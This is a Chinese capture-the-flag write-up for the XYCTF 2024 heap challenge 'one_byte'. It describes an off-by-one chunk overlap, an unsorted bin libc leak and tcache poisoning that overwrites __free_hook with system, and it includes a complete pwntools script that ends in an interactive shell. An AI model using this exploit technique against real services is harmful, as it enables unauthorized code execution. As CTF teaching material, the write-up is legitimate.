# one_byte

> 分类：Pwn

## 题目描述
堆题，libc 较新。利用 off-by-one（one_byte）造成 chunk extend 与 overlapping，通过 tcache 任意写修改 free_hook 为 system。

## 考察知识点
- unsorted bin leak
- off-by-one / chunk extend / overlapping
- tcache 任意写
- free_hook 劫持

## 解法
unsorted bin leak（leak 时记得把 tcache 耗光）；one_byte 造成 chunk extend 造成 overlapping；再改 tcache 的 next 地址达到任意写，修改 free_hook 为 system。

```python
from pwn import *
from time import sleep

context.log_level = 'debug'

#sh = process('./vuln')
sh = remote('127.0.0.1',42527)
libc = ELF('libc.so.6')

def add_chunk(idx,size):
    sh.recvuntil(b'>>> ')
    sh.sendline(b'1')
    sh.recvuntil(b'[?] please input chunk_idx: ')
    sh.sendline(str(idx).encode())
    sh.recvuntil(b'[?] Enter chunk size: ')
    sh.sendline(str(size).encode())

def delete_chunk(idx):
    sh.recvuntil(b'>>> ')
    sh.sendline(b'2')
    sh.recvuntil(b'[?] please input chunk_idx: ')
    sh.sendline(str(idx).encode())

def view_chunk(idx):
    sh.recvuntil(b'>>> ')
    sh.sendline(b'3')
    sh.recvuntil(b'[?] please input chunk_idx: ')
    sh.sendline(str(idx).encode())
    data=sh.recvuntil(b'Welcome to XYCTF\n')[:-17]
    return data

def edit_chunk(idx,data):
    sh.recvuntil(b'>>> ')
    sh.sendline(b'4')
    sh.recvuntil(b'[?] please input chunk_idx: ')
    sh.sendline(str(idx).encode())
    sleep(0.5)
    sh.send(data)

for i in range(0x7):
    add_chunk(i,0x200)
add_chunk(7,0x18)
add_chunk(8,0x18)
add_chunk(9,0x200)
add_chunk(10,0x18)
for i in range(0x7):
    delete_chunk(i)
#chunk 9 in unsorted bin
delete_chunk(9)
#chunk 7 off by one change chunk 8 size
edit_chunk(7,b'a'*0x18+b'\x41')
#chunk 8 overlapping with chunk 9
delete_chunk(8)
add_chunk(8,0x38)
#unsorted bin leak
data = view_chunk(8)[0x20:][:8]
libc_base = u64(data)-0x1ecbe0
print('libc_base',hex(libc_base))
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

#旧的chunk全都malloc走
for i in range(0x7):
    add_chunk(i,0x200)
add_chunk(9,0x200)

#再弄点新chunk
add_chunk(0x10,0x18)
add_chunk(0x11,0x18)
add_chunk(0x12,0x28)
add_chunk(0x13,0x18)
add_chunk(0x14,0x28)
#chunk 0x10 off by one
edit_chunk(0x10,b'a'*0x18+b'\x41')
delete_chunk(0x11)
add_chunk(0x11,0x38)
delete_chunk(0x14)
delete_chunk(0x12)
edit_chunk(0x11,p64(0)*3+p64(0x31)+p64(free_hook))
#赎回tcache
add_chunk(0x12,0x28)
add_chunk(0x14,0x28)

#0x14为free_hook
edit_chunk(0x14,p64(system_addr))

add_chunk(0x1f,0x20)
edit_chunk(0x1f,b'/bin/sh\x00')
delete_chunk(0x1f)

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
